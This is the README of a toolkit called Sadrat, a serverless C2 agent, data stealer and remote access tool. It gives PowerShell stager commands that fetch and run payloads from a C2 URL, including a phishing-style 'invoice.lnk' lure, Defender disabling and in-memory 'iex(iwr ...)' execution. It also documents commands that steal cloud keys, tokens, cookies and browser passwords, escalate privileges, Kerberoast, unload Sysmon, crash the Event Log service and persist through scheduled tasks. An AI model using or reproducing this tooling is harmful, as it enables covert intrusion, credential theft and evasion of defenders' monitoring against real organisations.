<p align="center" style="font-size: 48px; font-weight: bold;">
    Sadrat
</p>

<p align="center">
   Serverless C2 Agent, Datastealer and Remote Access Toolkit
</p>

<p align="center">
    <img src="sadrat.webp" alt="Sadrat Hacker" height="300"/>
</p>

#### Stagers
Zip up the .exe.config, dll and sideloading exe and base64.exe -n 0 -i then upload it into the module repo. Provide the url, stagers will decode and drop, extract, execute. 

##### LnkGen.ps1 - Generate a LNK Stager
```powershell
$url = "https://c2.serverless.com/api/assets/fhZip"
$zipName = "fh.zip"
$exeName = "FileHistory.exe"
$lnkPath = ".\invoice.lnk"
$iconPath = ".\adobe.png"

 .\LnkGen.ps1 -url $url -zipName $zipName -exeName $exeName -lnkPath $lnkPath # -iconPath $iconPath
```

##### SimpleStager - Drops to current Folder 
```powershell
$url = "https://c2.serverless.com/api/assets/fhZip"
$zipName = "fh.zip"
$exeName = "FileHistory.exe"

.\simpleStager.ps1 -url $url -zipName $zipName -exeName $exeName
```

##### systemStager - Running as SYSTEm/Admin Drops to AppData, random zipname, disables real-time monitoring and sets exclusions
```powershell
$url = "https://c2.serverless.com/api/assets/fhZip"
$exeName = "FileHistory.exe"

.\systemStager.ps1 -url $url -exeName $exeName
```

##### Stager.ps1 - Admin checks for install paths and optionally defender exlucsions/disabling

```powershell
$url = "https://c2.serverless.com/api/assets/fhZip"
$zipName = "fh.zip"
$exeName = "FileHistory.exe"

.\Stager.ps1 -url $url -zipName $zipName -exeName $exeName
```

##### noparamStager.ps1 - Set the params as vars in the script to make remote execution easier
```powershell
# edit before invoking
notepad .\noParamStager.ps1 
.\noParamStager.ps1 

# exec in memory from remote share
$url = ''
powershell -ep bypass iex(iwr -uri $url)
```

##### azSadrat.ps1 - Run a Stager on Azure VM or over PS-Session 
```powershell
$url =  "https://c2.serverless.com/api/assets/fhZip"
$zipName = "fh.zip"
$exeName = "FileHistory.exe"
$vmname = ""
$rg = ""
$scriptPath = ".\Stager.ps1"

# az
.\azSadrat.ps1 -az -url $url -zipName $zipName -exeName $exeName -vmName $vmName -resourceGroup $rg -scriptPath $scriptPath

# winRm
$Ip = ''
.\azSadrat.ps1 -winrm -url $url -zipName $zipName -exeName $exeName -vmName $Ip -scriptPath $scriptPath
```

<br>

<!-- #### Sorrowsync - Serverless API -->

<p align="center" style="font-size: 48px; font-weight: bold;">
    Sorrowsync - Serverless C2 API
</p>

<p align="center">
    <img src="sorrowsync.webp" alt="Serverless C2" height="300"/>
</p>

##### Deploy KeyVaults Function and Configure

Serverless C2 API/redirector, requires keyVault and managed Identity or access policy. KeyVault URL is stored in an env var. The API uses a scoped token to your github repo allowing read/write on the contents only. Store it in keyvault as ghToken, need the repoName and username and some other settings stored in the vault. The Function will retrieve what it needs to access github and read/write C2 as agents check in and post results. Bocklist is a good idea but not really implemented anymore. More to come on that.

xHooktoken is your agent's client api key, the other tokens are server-side api keys.

##### Deploy Keyvault with Secrets
```powershell
$vaultName = ""
$location = ""
$groupname = ""

# will prompt for values of the secrets needed for redirector
.\Scripts\Gen-Keyvault.ps1 -Vaultname $vaultName -locationname $location -groupname $groupname 
```

<!-- ##### Modules -->

<p align="center" style="font-size: 48px; font-weight: bold;">
    Graboid Modules
</p>

<p align="center">
    <img src="graboid.webp" alt="Stealer Module" height="300"/>
</p>

Included is one module 'Cloudish' which steals cloud credentials, tokens, configs, etc and posts to the C2. Compile it as a dll, then base64 encode and upload the txt file into 'assets'

```powershell
cd Modules\CloudishModule
dotnet build -c Release .
cd .\bin\release
base64.exe -n 0 -i .\cloudish.dll -o cloudish.txt
```

Put processed modules and other DLLs as base64 encoded text files aka 'roadtoken.txt' in 'assets' folder in root of the repo. The /assets/ route can be used to pull down libraries or execute tools, just compile them as dlls and add <Module>.Modes namespace, <moduleName> Class and Execute() method that does what you want. Create a new 'elseif' in the agent's Main method to handle the invocation f the new module and add new method calls as needed.



***TODO: Pull the blocklist and user agent blocks from the phishing functions and implement it in this project.


<br> 

#### Command Documentation
This document outlines the basic Sadrat commands, as well as the Graboid modules.

##### `shell <command>`
- **Description:** Executes a system shell command on the host machine.
- **Usage:** `shell <command>`
- **Details:** The command string after `shell` is passed directly to the operating system’s command interpreter. The result of the command is captured and written to a designated file.
- **Example:** `shell dir` executes the `dir` command in Windows shell.

##### `ls`
- **Description:** Lists files and directories in the current directory.
- **Usage:** `ls`
- **Details:** This command outputs the contents of the current working directory, similar to the Unix `ls` or Windows `dir` command.

##### `cd <path>`
- **Description:** Changes the current directory to `<path>`.
- **Usage:** `cd <path>`
- **Details:** Changes the working directory of the process. If the path is invalid, an error message is returned.
- **Example:** `cd /users/admin`

##### `exec <assemblyPath>`
- **Description:** Executes a .NET assembly from the specified path.
- **Usage:** `exec <assemblyPath>`
- **Details:** Loads and executes the assembly located at `<assemblyPath>`. Errors are reported if the file does not exist.
- **Example:** `exec C:\\path\\to\\assembly.dll`

##### `pwd`
- **Description:** Prints the current working directory.
- **Usage:** `pwd`
- **Details:** Returns the full path of the current working directory.

##### `ps`
- **Description:** Lists running processes.
- **Usage:** `ps`
- **Details:** Outputs a list of currently running processes on the system.

##### `cp <source> <destination>`
- **Description:** Copies a file or directory from `<source>` to `<destination>`.
- **Usage:** `cp <source> <destination>`
- **Details:** Attempts to copy the file or directory located at `<source>` to `<destination>`. Errors during copying are captured and logged.
- **Example:** `cp /path/source.txt /path/destination.txt`

##### `delete <path>`
- **Description:** Deletes a file or directory at `<path>`.
- **Usage:** `delete <path>`
- **Details:** Deletes the specified file or directory. Logs an error if the target does not exist.
- **Example:** `delete /path/to/file.txt`

##### `upload <filePath>`
- **Description:** Uploads a file to a specified server directory.
- **Usage:** `upload <filePath>`
- **Details:** Reads the content of the file at `<filePath>` and uploads it to a remote location. Only executed if the file exists.

##### `download <url>`
- **Description:** Downloads a file from the specified URL.
- **Usage:** `download <url>`
- **Details:** Downloads the file at the specified URL to the current working directory. Logs an error if the download fails.
- **Example:** `download http://example.com/file.txt`

##### `whoami`
- **Description:** Displays user information, including username and administrative privileges.
- **Usage:** `whoami`
- **Details:** Returns the current user's name and whether they have administrative rights.

##### `net`
- **Description:** Collects and displays network information, including local and public IP addresses, MAC address, and other network details.
- **Usage:** `net`
- **Details:** Gathers detailed network information including IP addresses, MAC address, and other relevant network statistics.

##### `mv <source> <destination>`
- **Description:** Moves a file or directory from `<source>` to `<destination>`.
- **Usage:** `mv <source> <destination>`
- **Details:** Attempts to move the file or directory located at `<source>` to `<destination>`. Logs an error if the operation fails.
- **Example:** `mv /path/source.txt /path/destination.txt`

##### `remote`
- **Description:** Retrieves detailed information about active network connections, logged-on users, shared resources, and RDP sessions on the local system. This command is designed to provide a comprehensive overview of the network and user activities to help in security monitoring and auditing.
- **Usage:** `remote`
- **Details:** This command combines several checks to gather data about:
  - SSH sessions active on the system.
  - Active TCP connections.
  - Remote connections to shared resources and logged-on users.
  - Active Windows sessions via the Windows Session Manager.
  - Active RDP sessions.
  - The output is tailored to provide actionable intelligence for network monitoring and anomaly detection.
- **Output:** Consolidates and returns the output from various checks into a single formatted string. The output includes:
  - SSH session details.
  - Active TCP connection details.
  - Details of connections to shared resources and logged-on users.
  - Information on active Windows and RDP sessions.
  - Each section is clearly marked and separated within the output for ease of analysis.

#### Sadmode - Module Loader for Sadrat

##### `audit`
- **Description:** Audits the system for privilege escalation opportunities.
- **Usage:** `audit`
- **Details:** Executes a comprehensive check to identify potential security vulnerabilities that could be exploited for privilege escalation, leveraging the upDawg_cloak module to analyze and report findings.

##### `services`
- **Description:** Part of Audit - Checks services through the upDawg module.
- **Usage:** `services`
- **Details:** This command checks and audits system services using the upDawg_cloak module to ensure they are operating as expected.

##### `hijackpaths`
- **Description:** Part of Audit - Performs path hijacking checks.
- **Usage:** `hijackpaths`
- **Details:** This command scans for and potentially exploits path hijacking vulnerabilities in system directories.

##### `autoruns`
- **Description:** Part of Audit - Examines autorun configurations.
- **Usage:** `autoruns`
- **Details:** This command performs checks on the autorun settings of the system to identify potentially malicious configurations.

##### `tokens`
- **Description:** Part of Audit - Checks and manages security tokens.
- **Usage:** `tokens`
- **Details:** This command explores security tokens present in the system to review their scopes and permissions.

##### `stealtoken`
- **Description:** Steals authentication tokens.
- **Usage:** `stealtoken`
- **Details:** Engages mechanisms to steal authentication tokens to elevate privileges or impersonate users.

##### `maketoken`
- **Description:** Creates a new authentication token.
- **Usage:** `maketoken`
- **Details:** This command generates a new authentication token using specified credentials.

##### `elevate`
- **Description:** Attempts to elevate privileges.
- **Usage:** `elevate`
- **Details:** Checks current user permissions and attempts to elevate privileges through the elevatorPitch module.

##### `getsystem`
- **Description:** Acquires highest system privileges.
- **Usage:** `getsystem`
- **Details:** This command tries to gain SYSTEM level privileges on the host machine using the elevatorPitch module.

##### `sysinfo`
- **Description:** System enumeration operations.
- **Usage:** `sysinfo`
- **Details:** Enumerates user and system information.

##### `cookies`
- **Description:** Retrieves and manages browser cookies.
- **Usage:** `cookies`
- **Details:** Executes operations related to extracting cookies from the target machine’s browsers through a specified module setup.

##### `task`
- **Description:** Creates a scheduled task to run the implant daily during specified hours if the user is logged in, or at logon if the user is an admin.
- **Usage:** `task`
- **Details:** This command sets up a persistent presence on the host machine through scheduled tasks, ensuring the implant executes regularly within the operational parameters defined (daily between 7 AM and 4 PM for users, and at every logon for administrators).

##### `cloud`
- **Description:** Steals Azure, AWS, SSH keys and credentials for multiple cloud services including GCP, Kubernetes, and checks for various configuration files related to cloud and development environments.
- **Usage:** `cloud`
- **Details:**
  - **SSH Keys and Cloud Credentials:** Extracts SSH keys and credentials for Azure, AWS, Google Cloud Platform, and Kubernetes.
  - **Configuration Files:** Searches for and extracts configurations for Docker, Heroku, Kubernetes, OpenShift, Terraform, Apache Maven, NPM, Python Pip, Git, FileZilla, PuTTY, mRemoteNG, RDP, Visual Studio, VSCode, Microsoft Teams, VPNs, Apache Directory Studio, CoreFTP, CyberDuck, S3 Browser, FTPNavigator, KeePass, PuttyCM, Rclone, WinSCP, gFTP, and more.
  - **Remote Connections Data:** 
    - Fetches and logs details of current remote connections including active SSH sessions, TCP connections, Windows logged-on sessions, and active RDP sessions. 
    - **Process:**
      - **Check SSH Sessions:** Determines if SSH sessions are active and logs the status.
      - **Active TCP Connections:** Lists current active TCP connections.
      - **Windows Sessions:** Utilizes the WindowsSessionManager to get details on currently logged-on sessions.
      - **RDP Sessions:** Checks for and lists active RDP sessions.
    - **Output:** Captures and returns all console outputs related to these checks, providing a comprehensive snapshot of active remote connections on the system.
  - **Specific Paths and Details:**
    - **Google Cloud Platform (GCP):** Checks for default configurations and credentials databases under the user's application data directory.
    - **Docker:** Looks for Docker configuration JSON files under the user profile.
    - **Heroku, Kubernetes, OpenShift:** Gathers `.netrc`, `.kube/config` files indicating login credentials and cluster configuration.
    - **NPM, Pip, Maven:** Retrieves configuration files that might contain registry authentication details.
    - **FileZilla, mRemoteNG, WinSCP:** Extracts site manager and session configuration files potentially storing FTP, SFTP credentials.
    - **PuTTY, RDP:** Collects session information and RDP connection files which can include server addresses and login hints.
    - **VPN Configurations:** Checks for VPN connection settings stored in the registry.
    - **KeePass:** Targets KeePass database files which may store encrypted credentials.
    - **Visual Studio, VSCode:** Retrieves settings that may contain user-defined configurations and extensions, potentially sensitive.
    - **CyberDuck, CoreFTP, gFTP:** Searches for bookmarks and configuration files that manage cloud storage and FTP connections.

##### `dotnet`
- **Description:** Scans the host, particularly user-writable directories, for .NET executables and reports on whether they are signed or considered service binaries.
- **Usage:** `dotnet`
- **Details:** This command is executed to analyze .NET executables present on the system. It assesses their signatures and relevance as service binaries, providing sideload, backdoored app and persistence opportunities.
- **Module Details:** Utilizes the `NetDriver` module to perform the scans and gather executable metadata.

##### `kroast`
- **Description:** Performs Kerberoasting on all Service Principal Names (SPNs) in the domain.
- **Usage:** `kroast`
- **Details:** This command exploits the Kerberos protocol by requesting service tickets for every SPN found within the Active Directory environment. Kerberoasting is an attack method that allows an attacker to extract service tickets and subsequently crack them offline to discover service account passwords.
- **Output:** The command logs the Kerberos tickets obtained from each SPN. If possible, the output includes both the encrypted tickets and any cracked passwords, noting that success in decryption depends on the complexity of the password and the cracking tools/methods used.
- **Security Considerations:**
  - **Risk:** This technique can expose vulnerabilities in the way service accounts are managed and how passwords are created within an organization.
  - **Mitigation:** Ensure that service account passwords are complex and changed regularly to reduce the risk of successful Kerberoasting.

##### `msdaisy`
- **Description:** Checks for vulnerable drivers by scraping the loldrivers.io database and Microsoft’s driver blocklist, comparing found driver hashes against these lists.
- **Usage:** `msdaisy`
- **Details:** Targets system drivers to identify potential vulnerabilities by comparing their hashes against known vulnerable or blocked drivers listed on loldrivers.io and official Microsoft repositories. This helps in identifying drivers that could be exploited or are already flagged by security communities.
- **Module Details:** Executes through the `MsDaisy` module which is specifically configured to fetch and compare driver data for security assessment.

##### `sysmop`
- **Description:** Custom module designed to unload the Sysmon driver, effectively stopping Sysmon from recording system events.
- **Usage:** `sysmop`
- **Details:** Directly interacts with system monitoring mechanisms to disable event logging by unloading the Sysmon driver, helping evade detection. This command uses the `Sysmop` module.
- **Output:** Confirms the unloading of the Sysmon driver and cessation of logging, writing status to the specified output file.

##### `atyourservice`
- **Description:** Enumerates all Windows services on the local host, specifically excluding those running under system accounts such as LocalSystem, NT Authority\LocalService, and NT Authority\NetworkService. This command is utilized to identify services running under non-system user accounts, which may present opportunities for privilege escalation.
- **Usage:** `atyourservice`
- **Details:** Leverages the `Win32_Service` WMI class to query detailed information about each service. It is specifically designed for local host analysis and aids in security audits by focusing on services that do not use default system accounts. Non-system accounts are targeted because services running under these accounts can be manipulated for privilege escalation if they have higher privileges or insecure configurations. Administrative privileges are required to access detailed service data.
- **Output:** The command outputs detailed listings of services not running under system accounts, including the service's name, display name, start name, and description. This information is crucial for identifying potential vulnerabilities that could be exploited for privilege escalation.

## In Development

##### `rdpatch` **TODO: REVISIT, may need to capture output correctly**
- **Description:** Patches the `termsvc.dll` to allow multiple RDP sessions, similar in functionality to tools like SharpDoor.
- **Usage:** `rdpatch`
- **Details:** Modifies system files specifically `termsvc.dll` to enable concurrent Remote Desktop Protocol sessions, bypassing the single-session limitation.
- **Output:** Writes the status of the patching process to a file, detailing success or errors encountered.

##### `tfinder` # Works as 64bit Exe, not as 64 or 32 bit DLL (tried with dedicated sadmodes in 32/64)
- **Description:** A custom version of SharpTokenFinder, tfinder extracts and analyzes security tokens from memory dumps of Microsoft 365 desktop applications for advanced security testing and auditing.
- **Usage:** `tfinder`
- **Details:** tfinder leverages detailed memory inspection techniques to target active Microsoft Office processes, identifying and extracting JWTs used for authentication to services such as Microsoft Graph and SharePoint. This tailored approach is designed to uncover hidden tokens that are crucial for access and authentication but are typically shielded from user and system visibility.
- **Output:** Outputs detailed token information including usernames, process origins, audience scope, and the complete token data. This output is vital for assessing security permissions and potential vulnerabilities in a Microsoft 365 environment. It mirrors the functionality of SharpTokenFinder, offering a specialized focus on security and compliance audits within enterprise settings.

##### `logjam` # Works as Exe, not as DLL
- **Description:** Forces the crash of the Event Log service on a specified server or local machine. This is used primarily to interrupt logging activities temporarily.
- **Usage:** `logjam`
- **Details:** This command utilizes native Windows API calls to interact directly with the Event Log service. It can target the local machine (if run with administrative privileges) or a remote server to clear the security log and cause a service crash. This is repeated multiple times to ensure the Event Log service does not restart immediately, aiming to keep it disabled for an extended period (approximately 24 hours).
- **Output:** Outputs messages about the status of the Event Log service, including confirmation of crashes and restart checks. Each step of the process is logged, providing feedback such as successful log clearing and any errors encountered during the operation.

##### `mori` - **Currently buggy, may not be capturing the output correctly or is taking forever (no results for a long time than they resume)**
- **Description:** Mod of Moriarty by BC Security - Checks for known CVEs on the system using data provided by BC Security.
- **Usage:** `mori`
- **Details:** Scans the host system for known vulnerabilities and reports any findings. Operates under the `Mori` module, named after Moriarty.
- **Output:** Provides a report on detected CVEs.

##### `tunnel`
- **Description:** Establishes a proxy tunnel similar to a SOCKS5 module, designed for penetration testing to access internal network resources.
- **Usage:** `tunnel`
- **Details:** The tunnel command deploys a proxy mechanism that acts like a secure tunnel, allowing penetration testers to route traffic through a compromised host within the target environment. This enables the exploration of internal networks and services that are otherwise isolated from direct external access.
- **Output:** Provides real-time status updates on the tunnel establishment and any errors encountered during the process. This functionality is critical for testers who need reliable and stealthy access to internal network segments during security assessments.

##### `chrome` **Currently buggy**
- **Description:** Decrypts stored passwords from Google Chrome. Note: This command might not fully work with all versions of Chrome, and future integration with cookies management is planned.
- **Usage:** `chrome`
- **Details:** Attempts to decrypt and retrieve saved passwords from Chrome's credential storage. Utilizes the `Chrome` module.
- **Output:** Writes the retrieved password data to a file specified by `id`.

##### `edgecrusher` **Currently very buggy**
- **Description:** Initially similar to the Chrome command, decrypts passwords from Microsoft Edge. This command is transitioning to handle only Edge data as functionalities are split.
- **Usage:** `edgecrusher`
- **Details:** Focuses on decrypting and extracting passwords stored in Microsoft Edge. The `Edgecrusher` module is tailored for operations specific to Edge.
- **Output:** Extracted password data is logged and written to a designated file.
